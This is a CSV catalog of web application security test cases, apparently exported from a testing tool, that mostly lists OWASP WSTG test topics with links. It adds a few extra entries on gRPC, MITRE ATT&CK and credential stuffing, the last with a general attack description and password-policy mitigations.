WSTG-07.05.3,OWASP-WSTG,Testing for SQL Server,Input_Validation_Testing,SQL Server,SQL Server issue,SQL Server,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.3,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md,,false,false,false
WSTG-07.05.5,OWASP-WSTG,Testing for MS Access,Input_Validation_Testing,MS Access,MS Access issue,MS Access,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.5,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md,,false,false,false
WSTG-07.05.6,OWASP-WSTG,Testing for NoSQL Injection,Input_Validation_Testing,NoSQL Injection,NoSQL Injection issue,NoSQL Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.6,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md,,false,false,false
WSTG-07.05.7,OWASP-WSTG,Testing for ORM Injection,Input_Validation_Testing,ORM Injection,ORM Injection issue,ORM Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.7,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md,,false,false,false
WSTG-07.05.8,OWASP-WSTG,Testing for Client-side,Input_Validation_Testing,Client-side,Client-side issue,Client-side,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.8,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md,,false,false,false
WSTG-07.08,OWASP-WSTG,Testing for SSI Injection,Input_Validation_Testing,SSI Injection,SSI Injection issue,SSI Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md,,false,false,false
WSTG-07.07,OWASP-WSTG,Testing for XML Injection,Input_Validation_Testing,XML Injection,XML Injection issue,XML Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md,,false,false,false
WSTG-07.06,OWASP-WSTG,Testing for LDAP Injection,Input_Validation_Testing,LDAP Injection,LDAP Injection issue,LDAP Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md,,false,false,false
WSTG-07.09,OWASP-WSTG,Testing for XPath Injection,Input_Validation_Testing,XPath Injection,XPath Injection issue,XPath Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md,,false,false,false
WSTG-07.10,OWASP-WSTG,Testing for IMAP SMTP Injection,Input_Validation_Testing,IMAP SMTP Injection,IMAP SMTP Injection issue,IMAP SMTP Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md,,false,false,false
WSTG-07.11,OWASP-WSTG,Testing for Code Injection,Input_Validation_Testing,Code Injection,Code Injection issue,Code Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.11,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md,,false,false,false
WSTG-07.11.1,OWASP-WSTG,Testing for Local File Inclusion,Input_Validation_Testing,Local File Inclusion,Local File Inclusion issue,Local File Inclusion,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.11.1,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.md,,false,false,false
WSTG-07.11.2,OWASP-WSTG,Testing for Remote File Inclusion,Input_Validation_Testing,Remote File Inclusion,Remote File Inclusion issue,Remote File Inclusion,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.11.2,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.md,,false,false,false
WSTG-07.13,OWASP-WSTG,Testing for Buffer Overflow,Input_Validation_Testing,Buffer Overflow,Buffer Overflow issue,Buffer Overflow,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.13,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Buffer_Overflow.md,,false,false,false
WSTG-07.13,OWASP-WSTG,Testing for Format String Injection,Input_Validation_Testing,Format String Injection,Format String Injection issue,Format String Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.13,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md,,false,false,false
WSTG-07.12,OWASP-WSTG,Testing for Command Injection,Input_Validation_Testing,Command Injection,Command Injection issue,Command Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.12,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md,,false,false,false
WSTG-07.14,OWASP-WSTG,Testing for Incubated Vulnerability,Input_Validation_Testing,Incubated Vulnerability,Incubated Vulnerability issue,Incubated Vulnerability,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.14,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md,,false,false,false
WSTG-07.15,OWASP-WSTG,Testing for HTTP Splitting Smuggling,Input_Validation_Testing,HTTP Splitting Smuggling,HTTP Splitting Smuggling issue,HTTP Splitting Smuggling,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.15,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md,,false,false,false
WSTG-07.17,OWASP-WSTG,Testing for Host Header Injection,Input_Validation_Testing,Host Header Injection,Host Header Injection issue,Host Header Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.17,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md,,false,false,false
WSTG-08.02,OWASP-WSTG,Testing for Stack Traces,Testing_for_Error_Handling,Stack Traces,Stack Traces issue,Stack Traces,2,Click TTRef link.,Discovery,Testing_for_Error_Handling,08.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces.md,,false,false,false
WSTG-09.01,OWASP-WSTG,Testing for Weak Transport Layer Security,Testing_for_Weak_Cryptography,Weak Transport Layer Security,Weak Transport Layer Security issue,Weak Transport Layer Security,2,Click TTRef link.,Discovery,Testing_for_Weak_Cryptography,09.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md,,false,false,false
WSTG-07.16,OWASP-WSTG,Testing for HTTP Incoming Requests,Input_Validation_Testing,HTTP Incoming Requests,HTTP Incoming Requests issue,HTTP Incoming Requests,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.16,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md,,false,false,false
WSTG-07.18,OWASP-WSTG,Testing for Server-side Template Injection,Input_Validation_Testing,Server-side Template Injection,Server-side Template Injection issue,Server-side Template Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.18,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md,,false,false,false
WSTG-08.01,OWASP-WSTG,Testing For Improper Error Handling,Testing_for_Error_Handling,Testing For Improper Error Handling,Testing For Improper Error Handling issue,Testing For Improper Error Handling,2,Click TTRef link.,Discovery,Testing_for_Error_Handling,08.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md,,false,false,false
WSTG-09.02,OWASP-WSTG,Testing for Padding Oracle,Testing_for_Weak_Cryptography,Padding Oracle,Padding Oracle issue,Padding Oracle,2,Click TTRef link.,Discovery,Testing_for_Weak_Cryptography,09.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md,,false,false,false
WSTG-09.04,OWASP-WSTG,Testing for Weak Encryption,Testing_for_Weak_Cryptography,Weak Encryption,Weak Encryption issue,Weak Encryption,2,Click TTRef link.,Discovery,Testing_for_Weak_Cryptography,09.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md,,false,false,false
WSTG-10.02,OWASP-WSTG,Test Ability to Forge Requests,Business_Logic_Testing,Test Ability to Forge Requests,Test Ability to Forge Requests issue,Test Ability to Forge Requests,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests.md,,false,false,false
WSTG-09.03,OWASP-WSTG,Testing for Sensitive Information Sent via Unencrypted Channels,Testing_for_Weak_Cryptography,Sensitive Information Sent via Unencrypted Channels,Sensitive Information Sent via Unencrypted Channels issue,Sensitive Information Sent via Unencrypted Channels,2,Click TTRef link.,Discovery,Testing_for_Weak_Cryptography,09.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md,,false,false,false
WSTG-10.00,OWASP-WSTG,Introduction to Business Logic,Business_Logic_Testing,Introduction to Business Logic,Introduction to Business Logic issue,Introduction to Business Logic,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.00,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic.md,,false,false,false
WSTG-10.01,OWASP-WSTG,Test Business Logic Data Validation,Business_Logic_Testing,Test Business Logic Data Validation,Test Business Logic Data Validation issue,Test Business Logic Data Validation,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.md,,false,false,false
WSTG-10.06,OWASP-WSTG,Testing for the Circumvention of Work Flows,Business_Logic_Testing,the Circumvention of Work Flows,the Circumvention of Work Flows issue,the Circumvention of Work Flows,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows.md,,false,false,false
WSTG-10.07,OWASP-WSTG,Test Defenses Against Application Misuse,Business_Logic_Testing,Test Defenses Against Application Misuse,Test Defenses Against Application Misuse issue,Test Defenses Against Application Misuse,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse.md,,false,false,false
WSTG-10.08,OWASP-WSTG,Test Upload of Unexpected File Types,Business_Logic_Testing,Test Upload of Unexpected File Types,Test Upload of Unexpected File Types issue,Test Upload of Unexpected File Types,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md,,false,false,false
WSTG-10.03,OWASP-WSTG,Test Integrity Checks,Business_Logic_Testing,Test Integrity Checks,Test Integrity Checks issue,Test Integrity Checks,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks.md,,false,false,false
WSTG-10.04,OWASP-WSTG,Test for Process Timing,Business_Logic_Testing,Test for Process Timing,Test for Process Timing issue,Test for Process Timing,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing.md,,false,false,false
WSTG-11.01,OWASP-WSTG,Testing for DOM-based Cross Site Scripting,Client-side_Testing,DOM-based Cross Site Scripting,DOM-based Cross Site Scripting issue,DOM-based Cross Site Scripting,2,Click TTRef link.,Discovery,Client-side_Testing,11.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md,,false,false,false
WSTG-11.03,OWASP-WSTG,Testing for HTML Injection,Client-side_Testing,HTML Injection,HTML Injection issue,HTML Injection,2,Click TTRef link.,Discovery,Client-side_Testing,11.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md,,false,false,false
WSTG-10.09,OWASP-WSTG,Test Upload of Malicious Files,Business_Logic_Testing,Test Upload of Malicious Files,Test Upload of Malicious Files issue,Test Upload of Malicious Files,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md,,false,false,false
WSTG-11.05,OWASP-WSTG,Testing for CSS Injection,Client-side_Testing,CSS Injection,CSS Injection issue,CSS Injection,2,Click TTRef link.,Discovery,Client-side_Testing,11.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md,,false,false,false
WSTG-10.05,OWASP-WSTG,Test Number of Times a Function Can Be Used Limits,Business_Logic_Testing,Test Number of Times a Function Can Be Used Limits,Test Number of Times a Function Can Be Used Limits issue,Test Number of Times a Function Can Be Used Limits,2,Click TTRef link.,Discovery,Business_Logic_Testing,10.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md,,false,false,false
WSTG-11.04,OWASP-WSTG,Testing for Client-side URL Redirect,Client-side_Testing,Client-side URL Redirect,Client-side URL Redirect issue,Client-side URL Redirect,2,Click TTRef link.,Discovery,Client-side_Testing,11.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md,,false,false,false
WSTG-11.06,OWASP-WSTG,Testing for Client-side Resource Manipulation,Client-side_Testing,Client-side Resource Manipulation,Client-side Resource Manipulation issue,Client-side Resource Manipulation,2,Click TTRef link.,Discovery,Client-side_Testing,11.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md,,false,false,false
WSTG-11.09,OWASP-WSTG,Testing for Clickjacking,Client-side_Testing,Clickjacking,Clickjacking issue,Clickjacking,2,Click TTRef link.,Discovery,Client-side_Testing,11.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md,,false,false,false
WSTG-11.10,OWASP-WSTG,Testing WebSockets,Client-side_Testing,Testing WebSockets,Testing WebSockets issue,Testing WebSockets,2,Click TTRef link.,Discovery,Client-side_Testing,11.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets.md,,false,false,false
WSTG-11.11,OWASP-WSTG,Testing Web Messaging,Client-side_Testing,Testing Web Messaging,Testing Web Messaging issue,Testing Web Messaging,2,Click TTRef link.,Discovery,Client-side_Testing,11.11,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md,,false,false,false
WSTG-11.12,OWASP-WSTG,Testing Browser Storage,Client-side_Testing,Testing Browser Storage,Testing Browser Storage issue,Testing Browser Storage,2,Click TTRef link.,Discovery,Client-side_Testing,11.12,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md,,false,false,false
WSTG-11.02,OWASP-WSTG,Testing for JavaScript Execution,Client-side_Testing,JavaScript Execution,JavaScript Execution issue,JavaScript Execution,2,Click TTRef link.,Discovery,Client-side_Testing,11.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md,,false,false,false
WSTG-11.07,OWASP-WSTG,Testing Cross Origin Resource Sharing,Client-side_Testing,Testing Cross Origin Resource Sharing,Testing Cross Origin Resource Sharing issue,Testing Cross Origin Resource Sharing,2,Click TTRef link.,Discovery,Client-side_Testing,11.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md,,false,false,false
WSTG-11.08,OWASP-WSTG,Testing for Cross Site Flashing,Client-side_Testing,Cross Site Flashing,Cross Site Flashing issue,Cross Site Flashing,2,Click TTRef link.,Discovery,Client-side_Testing,11.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md,,false,false,false
WSTG-11.13,OWASP-WSTG,Testing for Cross Site Script Inclusion,Client-side_Testing,Cross Site Script Inclusion,Cross Site Script Inclusion issue,Cross Site Script Inclusion,2,Click TTRef link.,Discovery,Client-side_Testing,11.13,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md,,false,false,false
WSTG-12.01,OWASP-WSTG,Test for APIs,API Testing,Test for APIs,API security issue,Cross Site Script Inclusion,2,Click TTRef link.,Discovery,API Testing,12.01,,,false,,,https://github.com/OWASP/wstg/blob/master/Testing_for_APIs.md,,false,false,false
WSTG-13.01,OWASP-WSTG,Test for Server-Side Request Forgery,SSRF Testing,Test for Server-Side Request Forgery,Server-Side Request Forgery (SSRF),Cross Site Script Inclusion,2,Click TTRef link.,Discovery,SSRF Testing,13.01,,,false,,,https://github.com/OWASP/wstg/blob/master/Testing_for_Server-Side_Request_Forgery.md,,false,false,false
EXT-20201109T224251,Extras,Security test cases for gRPC APIs,,,TODO:Search for CWE and click 'Use CWE Data'.,Extra Test,0,Click TTRef link.,Extras,Extras,,"For background on this issue, please refer to the CWE.",See 'Potential Mitigations' section of the referenced CWE.,true,http://cwe.mitre.org/index.html,https://github.com/OWASP/CheatSheetSeries/blob/master/Index.md,https://git.labs.nuance.com/security-testing/dast-grpc/-/blob/master/doc/TestCases.md,0,false,false,false
EXT-20201109T224952,Extras,Mitre Attack Framework,,,TODO:Search for CWE and click 'Use CWE Data'.,Extra Test,0,Think of other tests by reviewing the Mitre Attack Framework,Extras,Extras,,"For background on this issue, please refer to the CWE.",See 'Potential Mitigations' section of the referenced CWE.,false,http://cwe.mitre.org/index.html,https://github.com/OWASP/CheatSheetSeries/blob/master/Index.md,https://attack.mitre.org/tactics/enterprise/,0,false,false,false
EXT-20201109T225237,Extras,Credential Stuffing,,,Weak Password Requirements,Extra Test,3,"The attacker acquires spilled usernames and passwords from a website breach or password dump site.
The attacker uses an account checker to test the stolen credentials against many websites (for instance, social media sites or online marketplaces).
Successful logins (usually 0.1-0.2% of the total login attempts) allow the attacker to take over the account matching the stolen credentials.
The attacker drains stolen accounts of stored value, credit card numbers, and other personally identifiable information
The attacker may also use account information going forward for other nefarious purposes (for example, to send spam or create further transactions)",Extras,Extras,,"The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.

Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.","PHASE:Architecture and Design
DESCRIPTION:A product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes: Enforcement of a minimum and maximum length Restrictions against password reuse Restrictions against using common passwords Restrictions against using contextual string in the password (e.g., user id, app name) Depending on the threat model, the password policy may include several additional attributes. Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case) Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication. Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down). Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols. Large Minimum Length (encouraging passphrases instead of passwords) Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication. A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords. Randomly Chosen Secrets Generating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used. A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down. Password Expiration Requiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations. Password expiration may be a good mitigating technique when long complex passwords are not desired. See NIST 800-63B https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf Sections: 5.1.1, 10.2.1, and Appendix A for further information on password requirements.

PHASE:Architecture and Design
DESCRIPTION:Consider a second authentication factor beyond the password, which prevents the password from being a single point of failure. See CWE-308 for further information.

PHASE:Implementation
DESCRIPTION:Consider implementing a password complexity meter to inform users when a chosen password meets the required attributes.",false,https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html,https://attack.mitre.org/techniques/T1110/004/,https://owasp.org/www-community/attacks/Credential_stuffing,521,false,false,false
